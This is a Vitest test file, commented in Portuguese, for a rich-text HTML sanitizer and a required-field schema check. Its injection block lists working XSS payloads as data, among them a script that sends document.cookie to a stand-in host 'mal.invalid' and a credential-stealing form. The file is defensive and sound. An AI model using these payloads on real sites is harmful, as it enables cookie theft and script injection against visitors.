import { JSDOM } from 'jsdom'
import { describe, expect, it } from 'vitest'
import { createRichTextSanitizer, isBlankRichText } from '../src/rich-text'
import { buildZodSchema } from '../src/zod'
import { MESSAGES } from '../src/messages'

/**
 * A política de texto rico, exercitada com tentativas de injeção de verdade.
 *
 * O que estes casos protegem não é a formatação — é a página pública: o HTML
 * deste campo é escrito por um operador e renderizado no navegador do
 * visitante. Cada entrada abaixo é uma carga que executaria script se chegasse
 * inteira ao DOM.
 */
const sanitize = createRichTextSanitizer(new JSDOM('').window)

describe('o que a sanitização deixa passar', () => {
  it('mantém negrito, itálico, quebra de linha e o texto entre eles', () => {
    const html = 'A recomendação dos <br><strong>médicos-veterinários,</strong> <em>em números</em>'

    expect(sanitize(html)).toBe(html)
  })

  it('normaliza as formas visuais do editor para as canônicas', () => {
    expect(sanitize('<b><strong>destaque</strong></b>')).toBe('<strong>destaque</strong>')
    expect(sanitize('<i>ênfase</i>')).toBe('<em>ênfase</em>')
  })

  it('remove os atributos de apresentação que o editor exporta, sem perder o texto', () => {
    const doEditor =
      '<p class="titulo"><span style="white-space: pre-wrap;">A recomendação dos </span><br>' +
      '<b><strong style="white-space: pre-wrap;">médicos-veterinários,</strong></b>' +
      '<span style="white-space: pre-wrap;"> em números</span></p>'

    expect(sanitize(doEditor)).toBe(
      'A recomendação dos <br><strong>médicos-veterinários,</strong> em números',
    )
  })

  it('escapa o que era texto e parecia marcação', () => {
    expect(sanitize('1 &lt; 2 &amp; 3 &gt; 2')).toBe('1 &lt; 2 &amp; 3 &gt; 2')
  })

  it('devolve vazio para o que não é texto', () => {
    expect(sanitize(undefined)).toBe('')
    expect(sanitize(null)).toBe('')
    expect(sanitize({ toString: () => '<strong>x</strong>' })).toBe('')
  })
})

describe('tentativa real de injeção', () => {
  /**
   * Cada par é [carga, o que não pode sobreviver]. A asserção olha o HTML
   * resultante **e** o DOM montado a partir dele, porque uma carga pode
   * atravessar como texto inofensivo e virar elemento ao ser renderizada.
   */
  const cargas: readonly (readonly [string, string, readonly string[]])[] = [
    ['script direto', '<script>alert(document.cookie)</script>Título', ['script']],
    [
      'script depois de marcação permitida',
      '<strong>Título</strong><script>fetch("https://mal.invalid?c="+document.cookie)</script>',
      ['script'],
    ],
    ['manipulador em atributo de imagem', '<img src=x onerror="alert(1)">Título', ['img']],
    ['manipulador em atributo de tag permitida', '<strong onclick="alert(1)">Título</strong>', []],
    ['javascript: em href', '<a href="javascript:alert(1)">Clique</a>', ['a']],
    ['iframe apontando para outro site', '<iframe src="https://mal.invalid"></iframe>Título', ['iframe']],
    ['svg com manipulador', '<svg onload="alert(1)"><circle r="9"/></svg>Título', ['svg', 'circle']],
    ['style com expressão', '<style>*{background:url("javascript:alert(1)")}</style>Título', ['style']],
    ['form que rouba credencial', '<form action="https://mal.invalid"><input name="senha"></form>', ['form', 'input']],
    ['tag não permitida com atributo de evento', '<div onmouseover="alert(1)">Título</div>', ['div']],
    ['marcação mal formada para escapar do sanitizador', '<img src="x"/onerror=alert(1)//>Título', ['img']],
  ]

  it.each(cargas)('%s não chega à página', (_nome, carga, tagsProibidas) => {
    const limpo = sanitize(carga)

    expect(limpo).not.toMatch(/<\s*(script|iframe|img|svg|style|form|input|a|div)\b/i)
    expect(limpo.toLowerCase()).not.toContain('javascript:')
    expect(limpo).not.toMatch(/\son\w+\s*=/i)

    // O que importa de verdade: montar isto no navegador não cria elemento
    // executável nenhum, nem deixa atributo de evento em pé.
    const { document } = new JSDOM(`<body>${limpo}</body>`).window
    for (const tag of tagsProibidas) {
      expect(document.querySelectorAll(tag)).toHaveLength(0)
    }
    expect(document.querySelectorAll('script, iframe, img, svg, style, form, input, a')).toHaveLength(0)
    for (const elemento of Array.from(document.body.querySelectorAll('*'))) {
      expect(elemento.attributes).toHaveLength(0)
      expect(['STRONG', 'EM', 'BR']).toContain(elemento.tagName)
    }
  })

  it('preserva o texto que a carga carregava junto, exceto o corpo de script e style', () => {
    expect(sanitize('<div onmouseover="alert(1)">Título</div>')).toBe('Título')
    expect(sanitize('<script>alert(1)</script>Título')).toBe('Título')
  })
})

describe('campo obrigatório de texto rico', () => {
  const schema = buildZodSchema({
    fields: [{ name: 'heading', type: 'texto-rico', label: 'Título', required: true }],
    lists: [],
  })

  it('aceita HTML com texto', () => {
    expect(schema.safeParse({ heading: '<strong>Título</strong>' }).success).toBe(true)
  })

  it('recusa marcação sem texto nenhum, que na página seria um título vazio', () => {
    const result = schema.safeParse({ heading: '<strong></strong><br>' })

    expect(result.success).toBe(false)
    expect(result.error?.issues[0]?.message).toBe(MESSAGES.required)
  })

  it('reconhece o campo vazio por trás da marcação', () => {
    expect(isBlankRichText('<strong> </strong><br>&nbsp;')).toBe(true)
    expect(isBlankRichText('<strong>a</strong>')).toBe(false)
  })
})
